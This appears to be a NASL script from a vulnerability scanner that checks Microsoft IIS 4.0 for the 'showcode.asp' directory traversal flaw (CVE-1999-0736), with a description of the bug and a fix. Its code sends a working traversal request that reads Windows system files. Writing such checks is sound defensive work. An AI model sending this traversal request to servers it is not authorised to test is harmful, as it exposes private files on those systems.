# SPDX-FileCopyrightText: 1999 Immo Goltz (C-Plugin) / Renaud Deraison (Converted to NASL)
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10007");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-1999-0736");
  script_name("Microsoft IIS 'showcode.asp' Default File Directory Traversal Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 1999 Immo Goltz");
  script_family("Web application abuses"); # nb: No "Web Servers" family as the "showcode.asp" is more a web app
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_xref(name:"URL", value:"http://www.l0pht.com/advisories.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/167");

  script_tag(name:"summary", value:"Internet Information Server (IIS) 4.0 ships with a set of sample
  files to help web developers learn about Active Server Pages (ASP). One of this sample file is
  prone to a directory traversal vulnerability.");

  # nb: Description taken from http://www.l0pht.com/advisories.html
  script_tag(name:"insight", value:"One of these sample files, 'showcode.asp' (installed in
  /msadc/Samples/SELECTOR/), is designed to view the source code of the sample applications via a
  web browser.

  The 'showcode.asp' file does inadequate security checking and allows anyone with a web browser to
  view the contents of any text file on the web server. This includes files that are outside of the
  document root of the web server.

  The 'showcode.asp' file is installed by default at the URL:

  http://www.example.com/msadc/Samples/SELECTOR/showcode.asp

  It takes 1 argument in the URL, which is the file to view. The format of this argument is:
  source=/path/filename

  This is a fairly dangerous sample file since it can view the contents of any other files on the
  system. The author of the ASP file added a security check to only allow viewing of the sample
  files which were in the '/msadc' directory on the system. The problem is the security check does
  not test for the '..' characters within the URL. The only checking done is if the URL contains the
  string '/msadc/'. This allows URLs to be created that view, not only files outside of the samples
  directory, but files anywhere on the entire file system that the web server's document root is on.

  The full description can be found at the referenced link.");

  script_tag(name:"solution", value:"For production servers, sample files should never be installed,
  so delete the entire /msadc/samples directory. If you must have the 'showcode.asp' capability on a
  development server, the 'showcode.asp' file should be modified to test for URLs with '..' in them
  and deny those requests.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("list_array_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/msadc/Samples/SELECTOR/showcode.asp";
if( http_is_cgi_installed_ka( item:url, port:port ) ) {

  files = traversal_files( "windows" );

  foreach file( keys( files ) ) {

    url = "/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../../../" + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
  exit( 99 );
}

exit( 0 );
